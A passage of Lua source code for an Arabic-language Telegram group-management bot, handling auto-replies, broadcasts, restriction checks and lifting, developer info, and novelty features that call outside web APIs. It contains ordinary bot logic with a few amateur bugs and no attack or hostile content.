send(msg_chat_id, msg_id," * ٠ تم مسح الردود المتعدده*","md",true)
end
if text == "اضف رد متعدد" then   
if not msg.Supcreatorm then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
end
inlin = {
{{text = '- اضغط هنا للالغاء.',callback_data=msg.sender.user_id..'/cancelrdd'}},
}
send_inlin_key(msg_chat_id,"٠ ارسل الكلمه التي تريد اضافتها",inlin,msg_id)
Redis:set(darket.."Set:array"..msg.sender.user_id..":"..msg_chat_id,true)
return false
end

if text == "اضف رد عام" then 
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Set:Rd"..msg.sender.user_id..":"..msg_chat_id,true)
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'الغاء الامر', data = msg.sender.user_id..'/cancelrdd'},
},
}
}
return send(msg_chat_id,msg_id,"٠ ارسل الان الكلمه لاضافتها في الردود العامه ","md",false, false, false, false, reply_markup)
end 
if text == "حذف رد عام" then 
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Set:On"..msg.sender.user_id..":"..msg_chat_id,true)
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'الغاء الامر', data = msg.sender.user_id..'/cancelrdd'},
},
}
}
return send(msg_chat_id,msg_id,"٠ ارسل الان الكلمه لحذفها من الردود العامه","md",false, false, false, false, reply_markup)
end 
if text and not Redis:sismember(darket.."Spam:Group"..msg.sender.user_id,text) then
Redis:del(darket.."Spam:Group"..msg.sender.user_id) 
end
if text == "مسح الردود العامه" then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(darket.."List:Rd:Sudo")
for k,v in pairs(list) do
Redis:del(darket.."Add:Rd:Sudo:Gif"..v)
Redis:del(darket.."Add:Rd:Sudo:vico"..v)
Redis:del(darket.."Add:Rd:Sudo:stekr"..v)
Redis:del(darket.."Add:Rd:Sudo:Text"..v)
Redis:del(darket.."Add:Rd:Sudo:Photo"..v)
Redis:del(darket.."Add:Rd:Sudo:Photoc"..v)
Redis:del(darket.."Add:Rd:Sudo:Video"..v)
Redis:del(darket.."Add:Rd:Sudo:Videoc"..v)
Redis:del(darket.."Add:Rd:Sudo:File"..v)
Redis:del(darket.."Add:Rd:Sudo:Audio"..v)
Redis:del(darket.."Add:Rd:Sudo:Audioc"..v)
Redis:del(darket.."Add:Rd:Sudo:video_note"..v)
Redis:del(darket.."List:Rd:Sudo")
end
send(msg_chat_id,msg_id,"٠ تم مسح قائمه الردود العامه","md",true)  
end
if text == ("الردود العامه") then 
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(darket.."List:Rd:Sudo")
text = "\n٠ قائمة الردود العامه \n– – – – – – – –\n"
for k,v in pairs(list) do
if Redis:get(darket.."Add:Rd:Sudo:Gif"..v) then
db = "متحركه ٠"
elseif Redis:get(darket.."Add:Rd:Sudo:vico"..v) then
db = "بصمه ٠"
elseif Redis:get(darket.."Add:Rd:Sudo:stekr"..v) then
db = "ملصق ٠"
elseif Redis:get(darket.."Add:Rd:Sudo:Text"..v) then
db = "رساله ٠"
elseif Redis:get(darket.."Add:Rd:Sudo:Photo"..v) then
db = "صوره ٠"
elseif Redis:get(darket.."Add:Rd:Sudo:Video"..v) then
db = "فيديو ٠"
elseif Redis:get(darket.."Add:Rd:Sudo:File"..v) then
db = "ملف ٠"
elseif Redis:get(darket.."Add:Rd:Sudo:Audio"..v) then
db = "اغنيه ٠"
elseif Redis:get(darket.."Add:Rd:Sudo:video_note"..v) then
db = "بصمه فيديو ٠"
end
text = text..""..k.." ٠ {"..v.."} ٠ {"..db.."}\n"
end
if #list == 0 then
text = "٠ لا توجد ردود للمطور"
end
return send(msg_chat_id,msg_id,"["..text.."]","md",true)  
end
if text=="اذاعه خاص" then 
if not msg.Dev then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(3)..' * ',"md",true)  
end
if not msg.ControllerBot and not Redis:set(darket.."SendBcBot") then
return send(msg_chat_id,msg_id,'\n*٠ امر المغادره معطل من قبل الاساسي ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(darket.."Broadcasting:Users" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
send(msg_chat_id,msg_id,[[
↯︙ارسل لي سواء كان 
❨ ملف ، ملصق ، متحركه ، صوره
 ، فيديو ، بصمه الفيديو ، بصمه ، صوت ، رساله ❩
– – – – – – – –
↯︙للخروج ارسل ( الغاء )
 ✓
]],"md",true)  
return false
end

if text=="اذاعه" then 
if not msg.Dev then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(3)..' * ',"md",true)  
end
if not msg.ControllerBot and not Redis:set(darket.."SendBcBot") then
return send(msg_chat_id,msg_id,'\n*٠ امر المغادره معطل من قبل الاساسي ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(darket.."Broadcasting:Groups" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
send(msg_chat_id,msg_id,[[
↯︙ارسل لي سواء كان 
❨ ملف ، ملصق ، متحركه ، صوره
 ، فيديو ، بصمه الفيديو ، بصمه ، صوت ، رساله ❩
– – – – – – – –
↯︙للخروج ارسل ( الغاء )
 ✓
]],"md",true)  
return false
end

if text=="اذاعه بالتثبيت" then 
if not msg.Dev then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(3)..' * ',"md",true)  
end
if not msg.ControllerBot and not Redis:set(darket.."SendBcBot") then
return send(msg_chat_id,msg_id,'\n*٠ امر المغادره معطل من قبل الاساسي ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(darket.."Broadcasting:Groups:Pin" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
send(msg_chat_id,msg_id,[[
↯︙ارسل لي سواء كان 
❨ ملف ، ملصق ، متحركه ، صوره
 ، فيديو ، بصمه الفيديو ، بصمه ، صوت ، رساله ❩
– – – – – – – –
↯︙للخروج ارسل ( الغاء )
 ✓
]],"md",true)  
return false
end

if text=="اذاعه بالتوجيه" then 
if not msg.Dev then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(3)..' * ',"md",true)  
end
if not msg.ControllerBot and not Redis:set(darket.."SendBcBot") then
return send(msg_chat_id,msg_id,'\n*٠ امر المغادره معطل من قبل الاساسي ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(darket.."Broadcasting:Groups:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
send(msg_chat_id,msg_id,"٠ ارسل لي التوجيه الان\n٠ليتم نشره في المجموعات","md",true)  
return false
end

if text=="اذاعه خاص بالتوجيه" then 
if not msg.Dev then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(3)..' * ',"md",true)  
end
if not msg.ControllerBot and not Redis:set(darket.."SendBcBot") then
return send(msg_chat_id,msg_id,'\n*٠ امر المغادره معطل من قبل الاساسي ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(darket.."Broadcasting:Users:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
send(msg_chat_id,msg_id,"٠ ارسل لي التوجيه الان\n٠ليتم نشره الى المشتركين","md",true)  
return false
end
if text == 'كشف القيود' and msg.reply_to_message_id ~= 0 then
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
local GetMemberStatus = LuaTele.getChatMember(msg_chat_id,Message_Reply.sender.user_id).status
if GetMemberStatus.luatele == "chatMemberStatusRestricted" then
Restricted = 'مقيد'
else
Restricted = 'غير مقيد'
end
if Statusrestricted(msg_chat_id,Message_Reply.sender.user_id).BanAll == true then
BanAll = 'محظور عام'
else
BanAll = 'غير محظور عام'
end
if Statusrestricted(msg_chat_id,Message_Reply.sender.user_id).BanGroup == true then
BanGroup = 'محظور'
else
BanGroup = 'غير محظور'
end
if Statusrestricted(msg_chat_id,Message_Reply.sender.user_id).SilentGroup == true then
SilentGroup = 'مكتوم'
else
SilentGroup = 'غير مكتوم'
end
send(msg_chat_id,msg_id,"\n*٠ معلومات الكشف \n– – – – – – – –"..'\n٠الحظر العام : '..BanAll..'\n٠الحظر : '..BanGroup..'\n٠الكتم : '..SilentGroup..'\n٠التقييد : '..Restricted..'*',"md",true)  
end
if text and text:match('^كشف القيود @(%S+)$') then
local UserName = text:match('^كشف القيود @(%S+)$')
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
local GetMemberStatus = LuaTele.getChatMember(msg_chat_id,UserId_Info.id).status
if GetMemberStatus.luatele == "chatMemberStatusRestricted" then
Restricted = 'مقيد'
else
Restricted = 'غير مقيد'
end
if Statusrestricted(msg_chat_id,UserId_Info.id).BanAll == true then
BanAll = 'محظور عام'
else
BanAll = 'غير محظور عام'
end
if Statusrestricted(msg_chat_id,UserId_Info.id).BanGroup == true then
BanGroup = 'محظور'
else
BanGroup = 'غير محظور'
end
if Statusrestricted(msg_chat_id,UserId_Info.id).SilentGroup == true then
SilentGroup = 'مكتوم'
else
SilentGroup = 'غير مكتوم'
end
send(msg_chat_id,msg_id,"\n*٠معلومات الكشف \n– – – – – – – –"..'\n٠الحظر العام : '..BanAll..'\n٠الحظر : '..BanGroup..'\n٠الكتم : '..SilentGroup..'\n٠التقييد : '..Restricted..'*',"md",true)  
end
if text == 'رفع القيود' and msg.reply_to_message_id ~= 0 then
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
local GetMemberStatus = LuaTele.getChatMember(msg_chat_id,Message_Reply.sender.user_id).status
if GetMemberStatus.luatele == "chatMemberStatusRestricted" then
Restricted = 'مقيد'
LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'restricted',{1,1,1,1,1,1,1,1})
else
Restricted = ''
end
if Statusrestricted(msg_chat_id,Message_Reply.sender.user_id).BanAll == true and msg.ControllerBot then
BanAll = 'محظور عام ,'
Redis:srem(darket.."BanAll:Groups",Message_Reply.sender.user_id) 
else
BanAll = ''
end
if Statusrestricted(msg_chat_id,Message_Reply.sender.user_id).BanGroup == true then
BanGroup = 'محظور ,'
Redis:srem(darket.."BanGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) 
else
BanGroup = ''
end
if Statusrestricted(msg_chat_id,Message_Reply.sender.user_id).SilentGroup == true then
SilentGroup = 'مكتوم ,'
Redis:srem(darket.."SilentGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) 
else
SilentGroup = ''
end
send(msg_chat_id,msg_id,"\n*٠ تم رفع القيود عنه : {"..BanAll..BanGroup..SilentGroup..Restricted..'}*',"md",true)  
end
if text and text:match('^رفع القيود @(%S+)$') then
local UserName = text:match('^رفع القيود @(%S+)$')
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
local GetMemberStatus = LuaTele.getChatMember(msg_chat_id,UserId_Info.id).status
if GetMemberStatus.luatele == "chatMemberStatusRestricted" then
Restricted = 'مقيد'
LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,1,1,1,1,1,1,1})
else
Restricted = ''
end
if Statusrestricted(msg_chat_id,UserId_Info.id).BanAll == true and msg.ControllerBot then
BanAll = 'محظور عام ,'
Redis:srem(darket.."BanAll:Groups",UserId_Info.id) 
else
BanAll = ''
end
if Statusrestricted(msg_chat_id,UserId_Info.id).BanGroup == true then
BanGroup = 'محظور ,'
Redis:srem(darket.."BanGroup:Group"..msg_chat_id,UserId_Info.id) 
else
BanGroup = ''
end
if Statusrestricted(msg_chat_id,UserId_Info.id).SilentGroup == true then
SilentGroup = 'مكتوم ,'
Redis:srem(darket.."SilentGroup:Group"..msg_chat_id,UserId_Info.id) 
else
SilentGroup = ''
end
send(msg_chat_id,msg_id,"\n*٠ تم رفع القيود عنه : {"..BanAll..BanGroup..SilentGroup..Restricted..'}*',"md",true)  
end

if text == 'وضع كليشه المطور' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket..'GetTexting:Devdarket'..msg_chat_id..':'..msg.sender.user_id,true)
return send(msg_chat_id,msg_id,'٠ ارسل لي الكليشه الان')
end
if text == 'مسح كليشة المطور' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket..'Texting:Devdarket')
return send(msg_chat_id,msg_id,'٠ تم حذف كليشه المطور')
end
if text == 'المطور' or text == 'مطور' then
local TextingDevdarket = Redis:get(darket..'Texting:Devdarket')
if TextingDevdarket then 
return send(msg_chat_id,msg_id,TextingDevdarket,"md",true)  
else
local photo = LuaTele.getUserProfilePhotos(Sudo_Id)
local UserInfo = LuaTele.getUser(Sudo_Id)
Name_User = UserInfo.first_name
if photo then
return LuaTele.sendPhoto(msg.chat_id, msg.id, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id,
'*٠ مطور البوت : *['..Name_User..'](tg://user?id='..UserInfo.id..')**', "md",true)
else
return send(msg_chat_id,msg_id,
'*٠ مطور البوت : {*['..UserInfo.first_name..'](tg://user?id='..UserInfo.id..')*}*',"md",true) 
end
--return send(msg_chat_id,msg_id,'\n*٠ مطور البوت : {*['..UserInfo.first_name..'](tg://user?id='..UserInfo.id..')*}*',"md",true)  
end
end
---زخرفة ----
if text == "زخرفه" then
  local reply_markup = LuaTele.replyMarkup{
    type = 'inline',
    data = {
    {
    {text = '𝙀𝙉𝙂 ▴ زخࢪفھـۃ انجليزي', data = msg.sender.user_id..'/zeng'},
    },
    {
      {text = 'AR ▴ زخࢪفھـۃ عربي', data = msg.sender.user_id..'/zar'},
      },
    }
    }
  return send(msg_chat_id,msg_id, "مرحبا بك في زخرفه داركت","md",false,false,false,false,reply_markup)
end
-- z eng
if text and text:match("%a") and Redis:get(darket..msg_chat_id..msg.sender.user_id.."zkrf:") == "zeng" then
  Redis:del(darket..msg_chat_id..msg.sender.user_id.."zkrf:")
  Redis:set(darket..msg_chat_id..msg.sender.user_id.."zkrf:text", text)
  local api = https.request("https://api-jack.ml/api19.php?text="..URL.escape(text))
  local zkrf = JSON.decode(api)
  local reply_markup = LuaTele.replyMarkup{
    type = 'inline',
    data = {
      {{text = zkrf['anubis']['1'] , data = msg.sender.user_id..'/a1'}},
      {{text = zkrf['anubis']['2'] , data = msg.sender.user_id..'/a2'}},
      {{text = zkrf['anubis']['3'] , data = msg.sender.user_id..'/a3'}},
      {{text = zkrf['anubis']['4'] , data = msg.sender.user_id..'/a4'}},
      {{text = zkrf['anubis']['5'] , data = msg.sender.user_id..'/a5'}},
      {{text = zkrf['anubis']['6'] , data = msg.sender.user_id..'/a6'}},
      {{text = zkrf['anubis']['7'] , data = msg.sender.user_id..'/a7'}},
      {{text = zkrf['anubis']['8'] , data = msg.sender.user_id..'/a8'}},
      {{text = zkrf['anubis']['9'] , data = msg.sender.user_id..'/a9'}},
      {{text = zkrf['anubis']['10'] , data = msg.sender.user_id..'/a10'}},
      {{text = zkrf['anubis']['11'] , data = msg.sender.user_id..'/a11'}},
      {{text = zkrf['anubis']['12'] , data = msg.sender.user_id..'/a12'}},
      {{text = zkrf['anubis']['13'] , data = msg.sender.user_id..'/a13'}},
      {{text = zkrf['anubis']['14'] , data = msg.sender.user_id..'/a14'}},
      {{text = zkrf['anubis']['15'] , data = msg.sender.user_id..'/a15'}},
      {{text = zkrf['anubis']['16'] , data = msg.sender.user_id..'/a16'}},
      {{text = zkrf['anubis']['17'] , data = msg.sender.user_id..'/a17'}},
      {{text = zkrf['anubis']['18'] , data = msg.sender.user_id..'/a18'}},
      {{text = zkrf['anubis']['19'] , data = msg.sender.user_id..'/a19'}},
    }
    }
    return send(msg_chat_id,msg_id, "★ اختࢪ الزخࢪفھـۃ التي تࢪيدها\n ▽","html",false,false,false,false,reply_markup)
end
-- z ar 
if text and not text:match("%a") and Redis:get(darket..msg_chat_id..msg.sender.user_id.."zkrf:") == "zar" then
  Redis:del(darket..msg_chat_id..msg.sender.user_id.."zkrf:")
  Redis:set(darket..msg_chat_id..msg.sender.user_id.."zkrf:text", text)
  local api = https.request("https://api-jack.ml/api19.php?text="..URL.escape(text))
  local zkrf = JSON.decode(api)
  local reply_markup = LuaTele.replyMarkup{
    type = 'inline',
    data = {
      {{text = zkrf['anubis']['1'] , data = msg.sender.user_id..'/a1'}},
      {{text = zkrf['anubis']['2'] , data = msg.sender.user_id..'/a2'}},
      {{text = zkrf['anubis']['3'] , data = msg.sender.user_id..'/a3'}},
      {{text = zkrf['anubis']['4'] , data = msg.sender.user_id..'/a4'}},
      {{text = zkrf['anubis']['5'] , data = msg.sender.user_id..'/a5'}},
      {{text = zkrf['anubis']['6'] , data = msg.sender.user_id..'/a6'}},
      {{text = zkrf['anubis']['7'] , data = msg.sender.user_id..'/a7'}},
      {{text = zkrf['anubis']['8'] , data = msg.sender.user_id..'/a8'}},
      {{text = zkrf['anubis']['9'] , data = msg.sender.user_id..'/a9'}},
      {{text = zkrf['anubis']['10'] , data = msg.sender.user_id..'/a10'}},
      {{text = zkrf['anubis']['11'] , data = msg.sender.user_id..'/a11'}},
    }
    }
    return send(msg_chat_id,msg_id, "★ اختࢪ الزخࢪفھـۃ التي تࢪيدها\n ▽","html",false,false,false,false,reply_markup)
end
---برج---
-----معاني-الاسماء---
if text and text:match("^معني (.*)$") then
local TextName = text:match("^معني (.*)$")
as = http.request('https://167.71.14.2/Mean.php?Name='..URL.escape(TextName)..'')
mn = JSON.decode(as)
k = mn.meaning
send(msg_chat_id,msg_id,k,"md",true) 
end
---العمر---
if text and text:match("^احسب (.*)$") then
local Textage = text:match("^احسب (.*)$")
ge = https.request('https://boyka-api.ml/Calculateage.php?age='..URL.escape(Textage)..'')
ag = JSON.decode(ge)
i = 0
for k,v in pairs(ag.ok) do
i = i + 1
t = v.."\n"
end
send(msg_chat_id,msg_id,t,"md",true) 
end 

if text == 'ستيفن' or text == 'خالد'  then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = ' S𝑡𝑒Pℎ𝑒N', url = 't.me/R2RR7'}, 
},
}
}
return send(msg_chat_id,msg_id,"[S𝑡𝑒Pℎ𝑒N](tg://user?id=5386549632)","md",true, false, false, true, reply_markup)
end

if text == 'ابو المجد' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = ' Exp DarKet', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,"[ ᵗᵐ^𝒅𝒂𝒅.✹⃝⁦꙰🇲🇰𝒂𝒃𝒐.𝒂𝒍𝒎𝒂𝒈𝒅. 𝒆𝒍𝒎𝒆𝒍𝒐𝒌𒀭⸙ꠋꠋꠋꠋꠋꠋꠋꠋ](tg://user?id=5386549632)","md",true, false, false, true, reply_markup)
end

if text == "تفعيل صورتي" or text == "تفعيل الصوره" then
if not msg.Admin then
send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
Redis:del(darket.."myphoto"..msg_chat_id)
send(msg_chat_id,msg_id,'\n*٠ تم تفعيل امر صورتي * ',"md",true)  
end
if text == "تعطيل صورتي" or text == "تعطيل الصوره" then
if not msg.Admin then
send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
Redis:set(darket.."myphoto"..msg_chat_id,"off")
send(msg_chat_id,msg_id,'\n*٠ تم امر امر صورتي * ',"md",true)  
end
if text == "تفعيل نسبه جمالي" or text == "تفعيل جمالي" then
if not msg.Admin then
send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
Redis:del(darket.."mybuti"..msg_chat_id)
send(msg_chat_id,msg_id,'\n*٠ تم تفعيل امر جمالي * ',"md",true)  
end
if text == "تعطيل جمالي" or text == "تعطيل نسبه جمالي" then
if not msg.Admin then
send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
Redis:set(darket.."mybuti"..msg_chat_id,"off")
send(msg_chat_id,msg_id,'\n*٠ تم امر امر جمالي * ',"md",true)  
end
if text == "تفعيل قول" then
if not msg.Admin then
send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
Redis:del(darket.."sayy"..msg_chat_id)
send(msg_chat_id,msg_id,'\n*٠ تم تفعيل امر قول * ',"md",true)  
end
if text == "تعطيل قول" then
if not msg.Admin then
send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
Redis:set(darket.."sayy"..msg_chat_id,"off")
send(msg_chat_id,msg_id,'\n*٠ تم امر امر قول * ',"md",true)  
end
if text == "جمالي" or text == 'نسبه جمالي' then
if Redis:get(darket.."mybuti"..msg_chat_id) == "off" then
send(msg_chat_id,msg_id,'*٠ نسبه جمالي معطله*',"md",true) 
else
local photo = LuaTele.getUserProfilePhotos(msg.sender.user_id)
if msg.Dev then
if photo.total_count > 0 then
return LuaTele.sendPhoto(msg.chat_id, msg.id, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id,"*نسبه جمالك هي 900% عشان مطور ولازم اطبله😹♥*", "md")
else
return send(msg_chat_id,msg_id,'*٠ لا توجد صوره ف حسابك*',"md",true) 
end
else
if photo.total_count > 0 then
